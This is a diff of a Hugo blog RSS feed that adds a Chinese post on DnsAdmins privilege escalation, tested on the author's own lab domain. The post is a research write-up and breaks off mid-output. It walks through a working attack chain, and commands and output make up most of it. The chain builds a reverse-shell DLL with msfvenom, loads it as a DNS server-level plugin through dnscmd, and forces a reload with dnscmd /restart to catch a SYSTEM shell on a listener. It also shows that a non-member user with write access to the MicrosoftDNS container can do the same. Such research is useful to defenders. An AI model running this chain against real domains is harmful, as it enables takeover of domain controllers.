@@ -2,16 +2,236 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>wackymaker</title>
-        <link>http://localhost:1313/</link>
+        <link>https://wackymaker.github.io/</link>
         <description>Recent content on wackymaker</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Mon, 25 Aug 2025 15:15:18 +0800</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 25 Aug 2025 18:50:52 +0800</lastBuildDate><atom:link href="https://wackymaker.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Origins-wp</title>
+        <link>https://wackymaker.github.io/post/dnsadmin/</link>
+        <pubDate>Mon, 25 Aug 2025 18:50:52 +0800</pubDate>
+        
+        <guid>https://wackymaker.github.io/post/dnsadmin/</guid>
+        <description>&lt;h2 id=&#34;本文所使用环境&#34;&gt;本文所使用环境
+&lt;/h2&gt;&lt;p&gt;这篇环境当中，我使用的是我自建靶机&lt;a class=&#34;link&#34; href=&#34;https://www.wackymaker.com/post/bicher-%E8%87%AA%E5%BB%BA/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;bicker&lt;/a&gt;,其中tindalos就是dnsadmin组&lt;/p&gt;
+&lt;h2 id=&#34;本文阅读前置介绍&#34;&gt;本文阅读前置介绍
+&lt;/h2&gt;&lt;p&gt;dnsadmin作为域渗透中的一个常见提权思路，网上的文章已经有很多了，但是普遍是你抄我我抄你，大部分都是一个模板套出来的，其原因也很简单,最容易枚举到的是&lt;a class=&#34;link&#34; href=&#34;https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;nairuzabulhul&lt;/a&gt;的这篇博客，而那些“一般文章”普遍都是刻着它的模板，按照他们的解释来看，只要是dnsadmin组就允许执行以下操作进行提权&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;利用dnscmd.exe给dns的组件serverlevelplugindll注册恶意后门dll&lt;/li&gt;
+&lt;li&gt;监听shell&lt;/li&gt;
+&lt;li&gt;利用sc.exe重启服务，在服务重启的时候dns会加载恶意dll并回弹system权限shell&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;当然，在准备详细研究之前我也是这么觉得的，但是当我们真正配置了一个dnsadmin组则会发现dnsadmin组其实默认并不具备重启服务的权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;indalos&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; whoami /all
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;用户信息
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;----------------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;用户名          SID                                         
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;============================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bicker&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;indalos S-1-5-21-298176814-2846777796-698167141-1103
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;组信息
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-----------------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;组名                                        类型   SID                                          属性                                  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===========================================&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;======&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;============================================&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;======================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Everyone                                    已知组 S-1-1-0                                      必需的组, 启用于默认, 启用的组        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BUILTIN&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;emote Desktop Users                别名   S-1-5-32-555                                 必需的组, 启用于默认, 启用的组        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BUILTIN&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;emote Management Users             别名   S-1-5-32-580                                 必需的组, 启用于默认, 启用的组        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BUILTIN&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers                               别名   S-1-5-32-545                                 必需的组, 启用于默认, 启用的组        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BUILTIN&lt;span style=&#34;color:#ae81ff&#34;&gt;\P&lt;/span&gt;re-Windows &lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt; Compatible Access  别名   S-1-5-32-554                                 必需的组, 启用于默认, 启用的组        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NT AUTHORITY&lt;span style=&#34;color:#ae81ff&#34;&gt;\N&lt;/span&gt;ETWORK                        已知组 S-1-5-2                                      必需的组, 启用于默认, 启用的组        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NT AUTHORITY&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;uthenticated Users            已知组 S-1-5-11                                     必需的组, 启用于默认, 启用的组        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NT AUTHORITY&lt;span style=&#34;color:#ae81ff&#34;&gt;\T&lt;/span&gt;his Organization              已知组 S-1-5-15                                     必需的组, 启用于默认, 启用的组        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BICKER&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;nsAdmins                            别名   S-1-5-21-298176814-2846777796-698167141-1101 必需的组, 启用于默认, 启用的组, 本地组
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NT AUTHORITY&lt;span style=&#34;color:#ae81ff&#34;&gt;\N&lt;/span&gt;TLM Authentication            已知组 S-1-5-64-10                                  必需的组, 启用于默认, 启用的组        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Mandatory Label&lt;span style=&#34;color:#ae81ff&#34;&gt;\M&lt;/span&gt;edium Plus Mandatory Level 标签   S-1-16-8448                                                                        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;特权信息
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;----------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;特权名                        描述             状态  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=============================&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;================&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;======&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SeMachineAccountPrivilege     将工作站添加到域 已启用
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SeChangeNotifyPrivilege       绕过遍历检查     已启用
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SeIncreaseWorkingSetPrivilege 增加进程工作集   已启用
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;用户声明信息
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-----------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;用户声明未知。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;已在此设备上禁用对动态访问控制的 Kerberos 支持。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;indalos&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; sc.exe stop dns
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;SC&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; OpenService 失败 5:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;拒绝访问。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;indalos&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这意味着如果进入实战环境或者远程靶机环境，没有配置服务管理权限的dnsadmin将很难利用（无重启特权）&lt;/p&gt;
+&lt;h2 id=&#34;dnsadmin热重载&#34;&gt;dnsadmin热重载
+&lt;/h2&gt;&lt;p&gt;为了找寻如何在仅仅使用dnsadmin组权限进行服务重启类似效果时，我查看了&lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;MS-DNSP&lt;/a&gt;的文档，我查找到了这一行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;§If pszOperation is Restart, the server MUST restart the DNS server, and &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; success.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;文档中显示的结果就是服务器在R_DnssrvOperation中接受的命令有restart这个值，也意味着确实存在重启选项&lt;/p&gt;
+&lt;p&gt;于是我查看dnscmd&lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;dnscmd&lt;/a&gt;的文档，但是当我搜索restart的时候一无所获，走头无路的我找到了&lt;a class=&#34;link&#34; href=&#34;https://www.semperis.com/blog/dnsadmins-revisited/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Yuval Gordon&lt;/a&gt;的文章(事实上后续的研究我参考了他很多，感谢前人)，发现他找到了dnscmd存在/restart参数，当我尝试后，它真的成功了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#这里我使用的rev.dll为：msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.174.129 LPORT=443 -f dll -o rev.dll&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\u&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;indalos&amp;gt; dnscmd.exe /config /serverlevelplugindll C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\w&lt;/span&gt;irteTEMP&lt;span style=&#34;color:#ae81ff&#34;&gt;\r&lt;/span&gt;ev.dll
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;注册属性 serverlevelplugindll 成功重置。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;命令成功完成。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\u&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;indalos&amp;gt; dnscmd.exe /restart
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;. 已成功完成。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;命令成功完成。
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nc -lnvp &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listening on &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;any&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;connect to &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;192.168.174.129&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; from &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UNKNOWN&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;192.168.174.143&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54728&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Microsoft Windows &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;°汾 10.0.20348.169&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Microsoft Corporation¡£±£´̹ԐȨ&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;¡£
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\W&lt;/span&gt;indows&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这令我有点意外，因为我不理解为何它能重启服务，并且它并不在微软的文档当中，于是我对dnsadmin以及dnscmd的使用进行了研究&lt;/p&gt;
+&lt;p&gt;这种不利用sc执行的攻击类似于热重载，其本质上与服务重启的含义并不同，导致的效果也并不同，如果你对这块内容感兴趣，可以跳到本文章的 /restart优点和缺点&lt;/p&gt;
+&lt;h2 id=&#34;dnsadmin组权限解析及结论&#34;&gt;dnsadmin组权限解析及结论
+&lt;/h2&gt;&lt;p&gt;我们登陆环境当中的域管理并筛选dnsadmin对MicrosoftDNS容器的控制权限可以看到基本上就是通用all权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dsacls &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=MicrosoftDNS,CN=System,DC=bicker,DC=com&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;允许 BICKER&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;nsAdmins   特殊访问
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DELETE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    READ PERMISSONS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    WRITE PERMISSIONS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CHANGE OWNERSHIP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CREATE CHILD
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DELETE CHILD
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LIST CONTENTS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    WRITE SELF
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    WRITE PROPERTY
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    READ PROPERTY
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DELETE TREE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CONTROL ACCESS
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们尝试创建一个域用户且添加远程管理和对MicrosoftDNS的通用写入和读取&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; New-ADUser -Name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dns-test&amp;#34;&lt;/span&gt; -SamAccountName &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dns-test&amp;#34;&lt;/span&gt; -AccountPassword &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ConvertTo-S
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ecureString &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P@ssw0rd!&amp;#34;&lt;/span&gt; -AsPlainText -Force&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; -Enabled $true
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; Add-ADGroupMember -Identity &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Remote Management Users&amp;#34;&lt;/span&gt; -Members &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dns-test&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; dsacls &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=MicrosoftDNS,CN=System,DC=bicker,DC=com&amp;#34;&lt;/span&gt; /G &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BICKER\dns-test:GRGW&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;修改完毕后列出，可以看到dns-test用户并没有完全添加通用写入和通用读取，这可能是因为AD 对象类型限制，毕竟MicrosoftDNS本质上属于容器，域环境应该会阻止对其写入通用写入权限（这是我的猜测，其并不准确，我会在后续有时间的时候继续探讨这个问题）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;允许 BICKER&lt;span style=&#34;color:#ae81ff&#34;&gt;\d&lt;/span&gt;ns-test  特殊访问
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   READ PERMISSIONS &lt;span style=&#34;color:#75715e&#34;&gt;#通用读取&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   LIST CONTENTS &lt;span style=&#34;color:#75715e&#34;&gt;#列出内容&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   WRITE SELF &lt;span style=&#34;color:#75715e&#34;&gt;#写入自身&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   WRITE PROPERTY &lt;span style=&#34;color:#75715e&#34;&gt;#属性写入&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   READ PROPERTY &lt;span style=&#34;color:#75715e&#34;&gt;#属性读取&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   LIST OBJECT &lt;span style=&#34;color:#75715e&#34;&gt;#列出对象&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当我们登陆这个用户并尝试执行和之前tindalos用户（属于dnsadmin组）通用的加载权限的时候，令我惊讶的事情发生了，这个不在dnsadmin组当中的用户毫无阻碍的将system权限shell弹了回来&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\u&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\d&lt;/span&gt;ns-test&amp;gt; dnscmd.exe /config /serverlevelplugindll C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\w&lt;/span&gt;irteTEMP&lt;span style=&#34;color:#ae81ff&#34;&gt;\r&lt;/span&gt;ev.dll
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;注册属性 serverlevelplugindll 成功重置。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;命令成功完成。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\u&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\d&lt;/span&gt;ns-test&amp;gt; dnscmd.exe /restart
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;. 已成功完成。
